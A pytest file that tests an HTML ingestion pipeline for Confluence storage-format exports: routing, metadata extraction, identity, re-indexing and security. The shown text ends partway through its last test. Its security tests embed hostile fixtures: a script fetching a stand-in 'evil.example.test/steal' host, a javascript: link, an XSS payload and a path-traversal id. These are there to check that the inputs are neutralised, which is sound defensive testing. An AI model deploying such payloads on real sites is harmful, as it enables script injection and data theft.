"""Enriched HTML, end to end: from a file on disk to chunks a query could return.

The rest of ``tests/connectors`` stops at the bytes a connector hands over. This file does not,
because the claim being made is about what reaches the *index* — that the storage body arrives at
:class:`~manicule.parsers.confluence.ConfluenceStorageParser`, that the metadata banner does not
arrive anywhere, and that the document is keyed on the page rather than on where the page happens
to sit. Every one of those is invisible to a connector test and to a parser test alike; they are
properties of the seam between them, and a seam is where this project's defects have lived.

The pipeline is the real one, over the real parsers, with the store and vector index in memory.
Fixtures are synthetic throughout: invented page ids, ``https://docs.example.test/``, temporary
roots. Nothing here reaches a network, and ``test_nothing_here_opens_a_socket`` says so with a
guard rather than with a sentence.
"""

from __future__ import annotations

import dataclasses
import json
import socket
from pathlib import Path
from typing import TYPE_CHECKING, override

import pytest
from pydantic import ValidationError

from manicule.connectors import sidecar
from manicule.connectors.enriched import (
    ADAPTER_VERSION,
    DEFAULT_PROFILE,
    MAX_BODY_BYTES,
    OUTCOMES,
    AdapterOutcome,
    EnrichedProfile,
    UnusablePageError,
    adapt,
)
from manicule.connectors.enriched_html import write_sidecars
from manicule.connectors.filesystem import (
    DUPLICATE_IDENTITY,
    ENRICHED_KEY,
    FilesystemConnector,
)
from manicule.core.content import BlockKind, Chunk, DocumentStatus
from manicule.core.ids import chunk_id, content_hash, document_id
from manicule.ingest.middleware import MiddlewareRunner
from manicule.ingest.pipeline import IngestPipeline
from manicule.ingest.workers import InProcessRunner
from manicule.parsers.config import CONFLUENCE_MEDIA_TYPE, ConfluenceConfig, WebConfig
from manicule.parsers.confluence import ConfluenceStorageParser
from manicule.parsers.web import WebParser
from tests.fakes import HashEmbedder
from tests.ingest import fakes

if TYPE_CHECKING:
    from collections.abc import Iterable

    from manicule.core.content import Document, ParsedBlock

CANONICAL = "https://docs.example.test/pages/1002"

DOT = 'digraph G {\n  client -> server [label="{retry|fail}"];\n}'
"""The diagram body, written once and compared against character for character.

Deliberately awkward: an ASCII ``->`` that a bogus-comment reparse would swallow, and braces
inside a quoted label that a naive brace counter would call unbalanced. A DOT body of
``digraph G { a -> b; }`` would pass through almost any implementation and prove nothing.
"""

CODE = "def retry(attempts):\n    return attempts > 0"

ROWS: tuple[tuple[str, str], ...] = (
    ("Page ID", "1002"),
    ("Space", "ENG"),
    ("Version", "7"),
    ("Created", "2026-01-02T03:04:05Z"),
    ("Last modified", "2026-08-12T09:45:00Z"),
    ("Exported", "2026-08-12T10:00:00Z"),
    ("Source", f'<a href="{CANONICAL}">canonical page</a>'),
)

BODY = f"""
      <h1>Retry Runbook</h1>
      <h2 id="policy">Retry policy</h2>
      <p>The client retries twice.</p>

      <ac:structured-macro ac:name="code">
        <ac:parameter ac:name="language">python</ac:parameter>
        <ac:plain-text-body><![CDATA[{CODE}]]></ac:plain-text-body>
      </ac:structured-macro>

      <ac:structured-macro ac:name="graphviz">
        <ac:parameter ac:name="engine">circo</ac:parameter>
        <ac:plain-text-body><![CDATA[{DOT}]]></ac:plain-text-body>
      </ac:structured-macro>

      <ac:structured-macro ac:name="warning">
        <ac:rich-text-body><p>Never retry a write.</p></ac:rich-text-body>
      </ac:structured-macro>

      <ac:task-list>
        <ac:task><ac:task-id>1</ac:task-id><ac:task-status>complete</ac:task-status>
          <ac:task-body>Raise the ceiling</ac:task-body></ac:task>
        <ac:task><ac:task-id>2</ac:task-id><ac:task-status>incomplete</ac:task-status>
          <ac:task-body>Alert on exhaustion</ac:task-body></ac:task>
      </ac:task-list>

      <table><tr><th>Setting</th><th>Value</th></tr>
        <tr><td>ceiling</td><td><ac:structured-macro ac:name="code">
          <ac:parameter ac:name="language">bash</ac:parameter>
          <ac:plain-text-body><![CDATA[retries=2]]></ac:plain-text-body>
        </ac:structured-macro></td></tr></table>

      <ac:structured-macro ac:name="jira">
        <ac:parameter ac:name="jqlQuery">project = SECRET AND status = Open</ac:parameter>
      </ac:structured-macro>

      <ac:link><ri:page ri:content-title="Backoff"/>
        <ac:plain-text-link-body>backoff</ac:plain-text-link-body></ac:link>
      <p><a href="https://docs.example.test/pages/1003">the escalation page</a></p>
"""


def page(
    rows: tuple[tuple[str, str], ...] = ROWS,
    *,
    title: str = "Retry Runbook",
    body: str = BODY,
    sections: int = 1,
    bodies: int = 1,
    metadata_attribute: str = "data-source-metadata",
    body_attribute: str = 'data-document-representation="storage"',
    wrapper: str = "",
) -> str:
    """One enriched page. Everything a test needs to vary is a parameter rather than a substitution.

    ``rows`` and ``wrapper`` are written verbatim, so a test can put hostile markup in either.
    """
    block = "\n".join(f"      <p><strong>{label}:</strong> {value}</p>" for label, value in rows)
    banner = "\n".join(
        f"    <section {metadata_attribute}>\n{block}\n    </section>" for _ in range(sections)
    )
    main = "\n".join(f"    <main {body_attribute}>{body}</main>" for _ in range(bodies))
    return (
        f"<!doctype html>\n<html>\n  <head><title>{title}</title></head>\n  <body>\n"
        f"    <nav>Exported by the wiki mirror. Home | Spaces | Search</nav>\n"
        f"{wrapper}{banner}\n{main}\n  </body>\n</html>\n"
    )


def rows_replacing(label: str, value: str) -> tuple[tuple[str, str], ...]:
    return tuple((name, value if name == label else held) for name, held in ROWS)


def written(root: Path, name: str = "1002.html", body: str | None = None) -> Path:
    target = root / "pages" / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(body if body is not None else page(), encoding="utf-8")
    return target


def converted(root: Path, name: str = "1002.html", body: str | None = None) -> Path:
    """A page with its manifest beside it, which is what gives it its own identity."""
    target = written(root, name, body)
    write_sidecars(root, force=True)
    return target


class _Chunker(fakes.BlockChunker):
    """One chunk per block, carrying the block's language and metadata.

    :class:`~tests.ingest.fakes.BlockChunker` drops both, which is fine for the pipeline tests it
    was written for and is precisely wrong here: "the code language stays metadata and is not
    indexed as prose" is two claims, and a chunker that discards metadata can only ever check the
    second. A test that could not fail on the first would be asserting half a requirement.
    """

    @override
    def chunk(self, document: Document, blocks: Iterable[ParsedBlock]) -> list[Chunk]:
        return [
            Chunk(
                id=chunk_id(document.id, position, block.text),
                document_id=document.id,
                text=block.text,
                embed_text=f"{document.title} > {block.text}",
                anchor=block.anchor,
                heading_path=block.heading_path,
                kind=block.kind,
                position=position,
                token_count=max(1, len(block.text.split())),
                metadata={**block.metadata, **({"lang": block.lang} if block.lang else {})},
            )
            for position, block in enumerate(blocks)
        ]


def pipeline(store: fakes.MemoryIngestStore) -> IngestPipeline:
    """The real pipeline over the real parsers, routing by exact media type.

    ``resolve_chain`` is the routing this whole change turns on, so it is spelled out rather than
    stubbed to one parser: a document reaches the storage parser because its media type says
    ``profile=confluence-storage`` and for no other reason, which is the property under test.
    """
    chunker = _Chunker()
    return IngestPipeline(
        store=store,
        chunker=chunker,
        embedder=HashEmbedder(),
        vectors=fakes.MemoryVectors(),
        runner=InProcessRunner(
            {
                "confluence": ConfluenceStorageParser(ConfluenceConfig()),
                "web": WebParser(WebConfig()),
            }
        ),
        resolve_chain=lambda media: ["confluence"] if media == CONFLUENCE_MEDIA_TYPE else ["web"],
        middleware=MiddlewareRunner([]),
        chunk_fingerprint=chunker.fingerprint,
    )


async def ingest(
    root: Path, *, store: fakes.MemoryIngestStore | None = None, name: str = "docs"
) -> fakes.MemoryIngestStore:
    """Sync ``root`` through the pipeline and hand back the store it wrote to."""
    held = store if store is not None else fakes.MemoryIngestStore()
    await pipeline(held).run(FilesystemConnector(root, name=name))
    return held


def texts(store: fakes.MemoryIngestStore) -> list[str]:
    return [chunk.text for chunks in store.chunks.values() for chunk in chunks]


def only(store: fakes.MemoryIngestStore) -> Document:
    documents = list(store.documents.values())
    assert len(documents) == 1, f"expected one document, got {[d.source_id for d in documents]}"
    return documents[0]


# --- the critical acceptance test -----------------------------------------------------------
#
# The specification states this as eight clauses. They are eight assertions rather than one
# summary, because a single "it works" assertion is exactly how a requirement stops being
# checked: whichever clause breaks, the failure has to name it.


async def test_the_stored_document_is_typed_as_confluence_storage(tmp_path: Path) -> None:
    """Clause 1. The type is what routed it, so this is the whole of "it reached the parser"."""
    store = await ingest(await _corpus(tmp_path))

    assert only(store).media_type == CONFLUENCE_MEDIA_TYPE
    assert only(store).status is DocumentStatus.INDEXED
    assert only(store).metadata["parser_used"] == "confluence"


async def test_the_metadata_banner_is_absent_from_every_stored_chunk(tmp_path: Path) -> None:
    """Clause 2. Not "mostly absent": the banner is the thing generic ingestion indexed."""
    store = await ingest(await _corpus(tmp_path))

    for text in texts(store):
        for banner in ("Page ID", "Last modified", "Exported by the wiki mirror", CANONICAL):
            assert banner not in text, f"the wrapper reached a chunk: {text!r}"


async def test_a_configuration_parameter_is_never_indexed_as_prose(tmp_path: Path) -> None:
    """Clause 3, and the reason the storage parser exists at all.

    ``python`` and ``circo`` are what the macros *do*, not what the page says. The JQL query is
    the case that makes this more than untidy — indexed as prose it is a query nobody wrote on
    the page, quotable in a citation, and in this fixture it names a project.
    """
    store = await ingest(await _corpus(tmp_path))
    indexed = texts(store)

    for configuration in ("python", "circo", "project = SECRET"):
        assert not any(configuration in text for text in indexed), (
            f"{configuration!r} is macro configuration and reached the index as text"
        )
    # The other half of the claim, which absence alone cannot make: it is *kept*, as metadata.
    code = [chunk for chunks in store.chunks.values() for chunk in chunks if chunk.lang == "python"]
    assert code, "the language was dropped rather than moved to metadata"
    diagrams = [
        chunk
        for chunks in store.chunks.values()
        for chunk in chunks
        if chunk.metadata.get("engine") == "circo"
    ]
    assert diagrams, "the Graphviz engine was dropped rather than moved to metadata"


async def test_code_and_diagram_chunks_are_code(tmp_path: Path) -> None:
    """Clause 4. A diagram's source is text in a language, and is retrievable as such."""
    store = await ingest(await _corpus(tmp_path))
    kinds = {chunk.text: chunk.kind for chunks in store.chunks.values() for chunk in chunks}

    assert kinds[CODE] is BlockKind.CODE
    assert kinds[DOT] is BlockKind.CODE


async def test_the_diagram_source_survives_character_for_character(tmp_path: Path) -> None:
    """Clause 5, and the one clause a "close enough" implementation cannot fake.

    The body crosses four transformations between the file and the chunk — CDATA recovery, the
    extraction's serialisation, the parser's own re-parse, and text extraction — and every one of
    them is a place an escape can be doubled or a newline normalised.
    """
    store = await ingest(await _corpus(tmp_path))

    assert DOT in texts(store)
    diagram = next(text for text in texts(store) if text.startswith("digraph"))
    assert diagram == DOT
    assert "-&gt;" not in diagram, "an escape survived into the indexed text"


async def test_the_citation_carries_the_page_rather_than_the_file(tmp_path: Path) -> None:
    """Clause 6. Title, URL, page id, version and both timestamps, none standing in for another."""
    store = await ingest(await _corpus(tmp_path))
    stored = only(store)

    assert stored.title == "Retry Runbook"
    assert stored.uri == CANONICAL
    record = stored.provenance
    assert record is not None
    assert record.source is not None
    assert record.source.source_id == "1002"
    assert record.source.version == "7"
    assert record.source.created_at is not None
    assert record.source.modified_at is not None
    assert record.source.section_path == ("ENG",)
    assert record.snapshot is not None
    assert record.snapshot.path == "pages/1002.html", "the local snapshot survives being superseded"
    assert record.snapshot.retrieved_at is not None
    assert record.snapshot.retrieved_at != record.source.modified_at


async def test_the_identity_is_the_configured_instance_and_the_page_id(tmp_path: Path) -> None:
    """Clause 7. Not the path, and not the connector's *type* either — see #94."""
    store = await ingest(await _corpus(tmp_path), name="handbook")
    stored = only(store)

    assert stored.source_id == "1002"
    assert stored.id == document_id("default", "handbook", "1002")
    assert stored.id != document_id("default", "filesystem", "1002")


async def test_moving_the_file_does_not_create_a_second_document(tmp_path: Path) -> None:
    """Clause 8, and the reason identity had to move off the path at all.

    A mirror reorganised from by-space to by-tree is the ordinary case, not a pathological one.
    Keyed on the path it is a corpus of new documents beside a corpus of orphans, and the
    curated collections and tags hanging off the old rows go with them.
    """
    root = await _corpus(tmp_path)
    store = await ingest(root)
    before = only(store).id

    moved = root / "reorganised" / "runbooks"
    moved.mkdir(parents=True)
    for name in ("1002.html", "1002.html.source.json"):
        (root / "pages" / name).rename(moved / name)
    await ingest(root, store=store)

    assert only(store).id == before, "the page acquired a second document by being moved"
    assert only(store).provenance is not None
    assert only(store).provenance.snapshot is not None  # pyright: ignore[reportOptionalMemberAccess]
    assert only(store).provenance.snapshot.path == "reorganised/runbooks/1002.html"  # pyright: ignore[reportOptionalMemberAccess]


async def _corpus(tmp_path: Path) -> Path:
    """The specification's example page, converted, under a root of its own."""
    root = tmp_path / "corpus"
    root.mkdir()
    converted(root)
    return root


# --- the adapter contract --------------------------------------------------------------------


def test_every_combination_of_marker_counts_has_an_outcome() -> None:
    """The table is complete, checked against its own key space rather than by reading it.

    A missing row is a ``KeyError`` inside a walk over somebody's corpus, which surfaces as a
    connector crash rather than as a refused file.
    """
    buckets = ("0", "1", "many")
    assert set(OUTCOMES) == {(a, b) for a in buckets for b in buckets}


@pytest.mark.parametrize(
    ("html", "outcome", "names"),
    [
        (page(), AdapterOutcome.ADAPTED, ""),
        ("<html><body><p>An ordinary page.</p></body></html>", AdapterOutcome.NO_PROFILE, ""),
        (page(sections=2), AdapterOutcome.AMBIGUOUS, "2 x"),
        (page(bodies=2), AdapterOutcome.AMBIGUOUS, "2 x"),
        (page(body_attribute="data-something-else"), AdapterOutcome.MISSING_BODY, "0 x"),
        (page(metadata_attribute="data-something-else"), AdapterOutcome.INVALID_METADATA, "0 x"),
    ],
    ids=[
        "the supported default profile",
        "an unmarked file",
        "several metadata sections",
        "several storage bodies",
        "no storage body",
        "no metadata section",
    ],
)
def test_the_documented_shapes_reach_the_outcome_the_table_states(
    html: str, outcome: AdapterOutcome, names: str
) -> None:
    if outcome is AdapterOutcome.ADAPTED:
        assert adapt(html).profile is DEFAULT_PROFILE
        return
    with pytest.raises(UnusablePageError) as refused:
        adapt(html)
    assert refused.value.outcome is outcome
    assert names in str(refused.value)


def test_a_configured_alternate_marker_profile_reads_its_own_exporter() -> None:
    """A site whose exporter spells the markers differently configures one; it does not patch."""
    profile = EnrichedProfile(
        name="acme-export",
        metadata_selector="[data-acme-page]",
        body_selector='[data-acme-format="storage"]',
        labels={"identifier": "source_id", "revision": "version"},
    )
    html = page(
        (("Identifier", "77"), ("Revision", "3")),
        metadata_attribute="data-acme-page",
        body_attribute='data-acme-format="storage"',
    )

    adapted = adapt(html, profiles=(profile,))

    assert adapted.profile.name == "acme-export"
    assert adapted.page.source.source_id == "77"
    assert adapted.page.source.version == "3"


def test_the_default_profile_does_not_claim_another_exporters_page() -> None:
    """Precedence is not a fallback. A page marked for one profile is not read by another."""
    html = page(metadata_attribute="data-acme-page", body_attribute='data-acme-format="storage"')

    with pytest.raises(UnusablePageError, match="matches no configured") as refused:
        adapt(html)
    assert refused.value.outcome is AdapterOutcome.NO_PROFILE


def test_an_ambiguous_page_is_refused_rather_than_offered_to_the_next_profile() -> None:
    """Falling through is how a hostile file chooses which profile reads it.

    Two of one exporter's body markers is a refusal, full stop. Were it a "no match" the file
    would be handed to the next configured profile, and a document carrying both vocabularies
    could decide which of its two bodies got indexed by making the first one ambiguous.
    """
    other = EnrichedProfile(name="other", metadata_selector="[data-source-metadata]")

    with pytest.raises(UnusablePageError) as refused:
        adapt(page(bodies=2), profiles=(DEFAULT_PROFILE, other))
    assert refused.value.outcome is AdapterOutcome.AMBIGUOUS


def test_an_extracted_body_over_the_limit_is_refused() -> None:
    """The bound is on what is produced, not only on what is read."""
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr("manicule.connectors.enriched.MAX_BODY_BYTES", 64)
        with pytest.raises(UnusablePageError, match="over the 64-byte limit") as refused:
            adapt(page())
    assert refused.value.outcome is AdapterOutcome.FAILED
    assert MAX_BODY_BYTES > 64, "the real limit is not the one this test pinned"


def test_a_canonical_address_a_browser_would_execute_is_refused() -> None:
    """Refused by ``SourceMetadata`` itself, which is the point of constructing one."""
    with pytest.raises(UnusablePageError, match="will not cite") as refused:
        adapt(page(rows_replacing("Source", '<a href="javascript:alert(1)">page</a>')))
    assert refused.value.outcome is AdapterOutcome.INVALID_METADATA


# --- what the connector does with all that ---------------------------------------------------


async def test_an_ordinary_html_file_is_still_ordinary_html(tmp_path: Path) -> None:
    """The regression that must not happen, asserted at the level a user would notice it."""
    root = tmp_path / "corpus"
    root.mkdir()
    (root / "guide.html").write_text(
        "<html><head><title>Guide</title></head><body><h1>Guide</h1>"
        "<p>Ordinary prose.</p></body></html>",
        encoding="utf-8",
    )
    store = await ingest(root)
    stored = only(store)

    assert stored.media_type == "text/html"
    assert stored.metadata["parser_used"] == "web"
    assert ENRICHED_KEY not in stored.metadata
    assert stored.source_id == str(root / "guide.html"), "identity is the path with nothing to say"
    assert stored.provenance is None, "a file with no manifest gains no record"
    assert "Ordinary prose." in texts(store)


async def test_an_enriched_page_with_no_manifest_still_reaches_the_storage_parser(
    tmp_path: Path,
) -> None:
    """Adaptation and identity are separate, and only the second needs a manifest.

    A page nobody has run the conversion over is still read as storage format — its macros keep
    their meaning and its own title and address are cited — because ``fetch`` reads the file and
    can see what it is. What it does not get is an identity that survives being moved, because
    that has to be known at discovery and discovery does not read files.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    target = written(root)
    store = await ingest(root)
    stored = only(store)

    assert stored.media_type == CONFLUENCE_MEDIA_TYPE
    assert stored.uri == CANONICAL, "the page's own address, read out of the page"
    assert stored.source_id == str(target), "and its identity is still where it sits"
    assert DOT in texts(store)


async def test_a_page_the_adapter_refuses_is_indexed_as_html_with_the_reason_recorded(
    tmp_path: Path,
) -> None:
    """A refusal costs the reason, never the document.

    The wrapper is a perfectly good HTML file. Failing it would turn "this export is malformed"
    into "this page is missing", which is a strictly worse outcome and a much harder one to
    diagnose.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    written(root, body=page(bodies=2))
    store = await ingest(root)
    stored = only(store)

    assert stored.media_type == "text/html"
    assert stored.status is DocumentStatus.INDEXED
    refusal = stored.metadata[ENRICHED_KEY]
    assert isinstance(refusal, dict)
    assert refusal["outcome"] == AdapterOutcome.AMBIGUOUS.value
    assert "ambiguity" in str(refusal["reason"])


async def test_the_record_names_what_was_extracted_from_what(tmp_path: Path) -> None:
    """Two checksums, because they answer different questions and move independently."""
    root = await _corpus(tmp_path)
    store = await ingest(root)
    record = only(store).metadata[ENRICHED_KEY]

    assert isinstance(record, dict)
    assert record["profile"] == "standalone-storage"
    assert record["adapter_version"] == ADAPTER_VERSION
    assert record["representation"] == CONFLUENCE_MEDIA_TYPE
    assert record["snapshot_path"] == "pages/1002.html"
    assert record["snapshot_checksum"] != record["body_checksum"]
    assert record["body_checksum"] == only(store).content_hash, (
        "the digest the index is built from is the extracted body's, and the snapshot's is the "
        "one nothing else would hold"
    )


async def test_two_files_claiming_one_page_id_are_both_refused_it(tmp_path: Path) -> None:
    """Neither wins, and the reason names the other file.

    ``documents`` is UNIQUE on ``(workspace, source, source_id)``, so honouring both would mean
    whichever synced second overwriting the first with nothing raised. Keeping the *first* would
    be worse than keeping neither: which page owns the id would depend on walk order, so renaming
    a directory would silently move one page's content onto another page's identity.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    for name in ("a.html", "b.html"):
        target = written(root, name)
        # Written by hand rather than by `write_sidecars`, which refuses to create this
        # situation at all — see the test below. The connector still has to survive it, because a
        # manifest is a file in the corpus and anybody can put one there.
        sidecar.manifest_path_for(target).write_text(
            json.dumps({"source_id": "1002", "title": "Retry Runbook"}), encoding="utf-8"
        )

    found = [doc async for doc in FilesystemConnector(root, name="docs").discover(None)]

    assert {doc.ref.source_id for doc in found} == {
        str(root / "pages" / "a.html"),
        str(root / "pages" / "b.html"),
    }
    for doc in found:
        assert "1002" in str(doc.ref.metadata[DUPLICATE_IDENTITY])
        assert "UNIQUE" in str(doc.ref.metadata[DUPLICATE_IDENTITY])

    store = await ingest(root)
    assert len(store.documents) == 2, "one page silently overwrote the other"
    for stored in store.documents.values():
        assert "also declares" in str(stored.metadata[DUPLICATE_IDENTITY])


async def test_reconcile_and_discover_agree_about_what_a_document_is_called(
    tmp_path: Path,
) -> None:
    """Two answers to "what is this called" is a corpus that reports every page deleted."""
    root = await _corpus(tmp_path)
    connector = FilesystemConnector(root, name="docs")

    discovered = {doc.ref.source_id async for doc in connector.discover(None)}
    reconciled = {identity async for identity in connector.reconcile()}

    assert discovered == reconciled == {"1002"}


# --- reconciliation and updates ---------------------------------------------------------------


async def test_re_ingesting_an_unchanged_page_re_embeds_nothing(tmp_path: Path) -> None:
    root = await _corpus(tmp_path)
    store = await ingest(root)
    before = {chunk.id for chunks in store.chunks.values() for chunk in chunks}

    report = await pipeline(store).run(FilesystemConnector(root, name="docs"))

    assert report.skipped_version == 1
    assert report.indexed == 0
    assert {chunk.id for chunks in store.chunks.values() for chunk in chunks} == before


async def test_a_changed_body_is_reparsed_under_the_same_identity(tmp_path: Path) -> None:
    root = await _corpus(tmp_path)
    store = await ingest(root)
    before = only(store).id

    converted(root, body=page(body=BODY.replace("retries twice", "retries five times")))
    await ingest(root, store=store)

    assert only(store).id == before
    assert any("retries five times" in text for text in texts(store))


async def test_a_corrected_manifest_updates_the_citation_over_an_unchanged_body(
    tmp_path: Path,
) -> None:
    """Metadata and content change independently, and cost different things to repair."""
    root = await _corpus(tmp_path)
    store = await ingest(root)
    manifest = root / "pages" / "1002.html.source.json"
    held = json.loads(manifest.read_text(encoding="utf-8"))
    held["title"] = "Retry Runbook (revised)"
    held["version"] = "8"
    manifest.write_text(json.dumps(held), encoding="utf-8")

    await ingest(root, store=store)
    stored = only(store)

    assert stored.title == "Retry Runbook (revised)"
    assert stored.provenance is not None
    assert stored.provenance.source is not None
    assert stored.provenance.source.version == "8"


async def test_a_new_adapter_version_rebuilds_the_derived_body(tmp_path: Path) -> None:
    """The change token covers the adapter, so a changed extraction is not invisible.

    **Both halves are run, because only the pair proves anything.** A changed adapter over an
    unchanged file moves nothing a filesystem can see — the size and the modification time are
    the file's, not the extraction's — so the first half shows the page skipping before it is
    ever fetched, which is precisely the failure ``ADAPTER_VERSION`` is in the token to prevent.
    The second shows the same changed adapter reaching the index once the version moves with it.

    Nothing is re-downloaded either way, because there is nothing to download: the snapshot is a
    local file and was never thrown away.
    """

    root = await _corpus(tmp_path)
    store = await ingest(root)
    original = adapt

    def improved(html: str, **kwargs: object) -> object:
        adapted = original(html, **kwargs)  # pyright: ignore[reportArgumentType]
        return dataclasses.replace(adapted, body=adapted.body + "<p>read by a newer adapter</p>")

    with pytest.MonkeyPatch.context() as patch:
        patch.setattr("manicule.connectors.filesystem.adapt", improved)
        unchanged = await pipeline(store).run(FilesystemConnector(root, name="docs"))

    assert unchanged.skipped_version == 1, (
        "a changed adapter over an unchanged file has to move the token; nothing else about the "
        "file differs, so without it the page is skipped before it is fetched"
    )
    assert not any("newer adapter" in text for text in texts(store))

    with pytest.MonkeyPatch.context() as patch:
        patch.setattr("manicule.connectors.filesystem.adapt", improved)
        patch.setattr("manicule.connectors.filesystem.ADAPTER_VERSION", "enriched-html/2")
        rebuilt = await pipeline(store).run(FilesystemConnector(root, name="docs"))

    assert rebuilt.skipped_version == 0
    assert rebuilt.indexed == 1
    assert any("read by a newer adapter" in text for text in texts(store))


async def test_a_deleted_page_stops_being_reconciled(tmp_path: Path) -> None:
    root = await _corpus(tmp_path)
    connector = FilesystemConnector(root, name="docs")
    assert [identity async for identity in connector.reconcile()] == ["1002"]

    (root / "pages" / "1002.html").unlink()
    (root / "pages" / "1002.html.source.json").unlink()

    assert [identity async for identity in connector.reconcile()] == []


# --- security ---------------------------------------------------------------------------------


async def test_a_script_in_the_wrapper_reaches_no_chunk_and_is_never_run(tmp_path: Path) -> None:
    """The wrapper is untrusted, and the parts of it that are not the body are not indexed."""
    root = tmp_path / "corpus"
    root.mkdir()
    written(
        root,
        body=page(wrapper='<script>fetch("https://evil.example.test/steal")</script>\n'),
    )
    store = await ingest(root)

    assert not any("evil.example.test" in text for text in texts(store))
    assert not any("fetch(" in text for text in texts(store))


async def test_hostile_markup_inside_cdata_stays_text(tmp_path: Path) -> None:
    """CDATA exists so a body can hold ``<`` without being markup, and it stays that way.

    Escaped on recovery rather than promoted to an element, which is the difference between a
    content-loss bug and an execution one.
    """
    hostile = '<script>alert("x")</script> & <img src=x onerror=y>'
    root = tmp_path / "corpus"
    root.mkdir()
    written(
        root,
        body=page(
            body=f'<h1>T</h1><ac:structured-macro ac:name="code">'
            f"<ac:plain-text-body><![CDATA[{hostile}]]></ac:plain-text-body>"
            f"</ac:structured-macro>"
        ),
    )

    adapted = adapt((root / "pages" / "1002.html").read_text(encoding="utf-8"))
    assert "&lt;script&gt;" in adapted.body, "the body was promoted from text to markup"

    store = await ingest(root)
    assert hostile in texts(store), "the body was lost rather than kept inert"


async def test_a_traversal_shaped_page_id_is_a_string_and_never_a_path(tmp_path: Path) -> None:
    """Identity is stored, never joined to anything and never opened."""
    root = tmp_path / "corpus"
    root.mkdir()
    escape = tmp_path / "escape-target"
    escape.mkdir()
    converted(root, body=page(rows_replacing("Page ID", "../../../escape-target/owned")))

    store = await ingest(root)

    assert only(store).source_id == "../../../escape-target/owned"
    assert list(escape.iterdir()) == [], "a page id reached the filesystem"
    assert only(store).media_type == CONFLUENCE_MEDIA_TYPE


async def test_a_symlink_out_of_the_root_is_not_followed(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "1003.html").write_text(page(), encoding="utf-8")
    root = tmp_path / "corpus"
    (root / "pages").mkdir(parents=True)
    (root / "pages" / "link.html").symlink_to(outside / "1003.html")

    store = await ingest(root)

    assert store.documents == {}


async def test_an_oversized_page_is_not_read_into_memory(tmp_path: Path) -> None:
    """The connector's own fetch cap is the pipeline's; this pins the conversion's."""
    root = tmp_path / "corpus"
    root.mkdir()
    from manicule.connectors.enriched_html import MAX_HTML_BYTES  # noqa: PLC0415

    (root / "huge.html").write_bytes(b"<html>" + b"x" * (MAX_HTML_BYTES + 1))

    outcomes = write_sidecars(root)

    assert not outcomes[0].written
    assert outcomes[0].outcome is AdapterOutcome.FAILED
    assert "over the" in outcomes[0].skipped_reason


def test_nothing_here_opens_a_socket(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A canonical URL is read out of an attribute. Nothing dereferences it, ever."""
    root = tmp_path / "corpus"
    root.mkdir()
    written(root)

    def refuse(*args: object, **kwargs: object) -> None:
        message = "adaptation opened a socket"
        raise AssertionError(message)

    monkeypatch.setattr(socket, "socket", refuse)
    monkeypatch.setattr(socket, "create_connection", refuse)

    assert write_sidecars(root)[0].written
    assert adapt((root / "pages" / "1002.html").read_text(encoding="utf-8")).page.source.source_id


# --- the conversion run reports every file ------------------------------------------------------


def test_a_run_that_adapted_nothing_says_so_per_file(tmp_path: Path) -> None:
    """A run reporting only successes presents "wrong directory" as a clean conversion."""
    (tmp_path / "plain.html").write_text("<html><body>hi</body></html>", encoding="utf-8")
    (tmp_path / "half.html").write_text(page(bodies=0), encoding="utf-8")

    outcomes = write_sidecars(tmp_path)

    assert not any(outcome.written for outcome in outcomes)
    assert {outcome.path.name: outcome.outcome for outcome in outcomes} == {
        "plain.html": AdapterOutcome.NO_PROFILE,
        "half.html": AdapterOutcome.MISSING_BODY,
    }
    assert all(outcome.skipped_reason for outcome in outcomes)


def test_the_manifest_records_the_representation_and_not_the_adapter_version(
    tmp_path: Path,
) -> None:
    """One of those is a fact about the page; the other is a fact about this build.

    A manifest declaring the adapter version would either be believed — recording a version that
    never ran — or checked, refusing every existing manifest the day the adapter improved.
    """
    written(tmp_path)
    write_sidecars(tmp_path)

    manifest = json.loads((tmp_path / "pages" / "1002.html.source.json").read_text("utf-8"))

    assert manifest["content_type"] == CONFLUENCE_MEDIA_TYPE
    assert "adapter_version" not in manifest
    assert "body_checksum" not in manifest
    assert manifest["source_id"] == "1002"


def test_the_conversion_and_the_connector_are_configured_with_one_profile_set(
    tmp_path: Path,
) -> None:
    """A page one adapted and the other refused would leave two reports disagreeing about a file."""
    profile = EnrichedProfile(name="acme", metadata_selector="[data-acme-page]")
    written(tmp_path, body=page(metadata_attribute="data-acme-page"))

    assert write_sidecars(tmp_path, profiles=(DEFAULT_PROFILE,))[0].outcome is (
        AdapterOutcome.INVALID_METADATA
    )
    assert write_sidecars(tmp_path, force=True, profiles=(profile,))[0].written


# --- storage-format semantics, through the enriched path ---------------------------------------
#
# The parser's own suite covers these against a bare storage body. They are repeated here against
# a body that arrived *inside an enriched wrapper*, because that is the path this change adds and
# the failure it could introduce is a body that reaches the parser subtly altered by extraction.


async def test_the_page_keeps_its_structure_through_the_wrapper(tmp_path: Path) -> None:
    """Every semantic §5 lists, asserted on what the index actually holds."""
    store = await ingest(await _corpus(tmp_path))
    chunks = [chunk for held in store.chunks.values() for chunk in held]
    by_kind = {chunk.kind for chunk in chunks}

    panels = [chunk for chunk in chunks if chunk.kind is BlockKind.PANEL]
    assert panels, "the warning panel was flattened into prose"
    assert panels[0].metadata["severity"] == "warning"
    assert "Never retry a write." in panels[0].text

    tasks = next(chunk for chunk in chunks if chunk.text.startswith("- ["))
    assert "- [x] Raise the ceiling" in tasks.text
    assert "- [ ] Alert on exhaustion" in tasks.text
    assert tasks.metadata["complete"] == 1
    assert not any(chunk.text == "incomplete" for chunk in chunks), (
        "a task's state reached the index as a one-word block of its own"
    )

    table = next(chunk for chunk in chunks if chunk.kind is BlockKind.TABLE)
    assert "Setting | Value" in table.text
    assert "ceiling | retries=2" in table.text, "the macro inside the cell lost its body"
    assert "bash" not in table.text, "the macro's language leaked out of a table cell"

    placeholder = next(chunk for chunk in chunks if "unsupported macro" in chunk.text)
    assert placeholder.text == "[unsupported macro: jira]"
    assert placeholder.metadata["parameters"] == ["jqlQuery"], (
        "the parameter name makes the omission auditable; its value must not be in the index"
    )

    # A page reference and an external link are structured, and each is recorded beside the text
    # of the block it appears in rather than inside it. The two are separate blocks here because
    # the author wrote them in separate paragraphs, which is the point: the reference travels with
    # the sentence it belongs to.
    references: list[object] = []
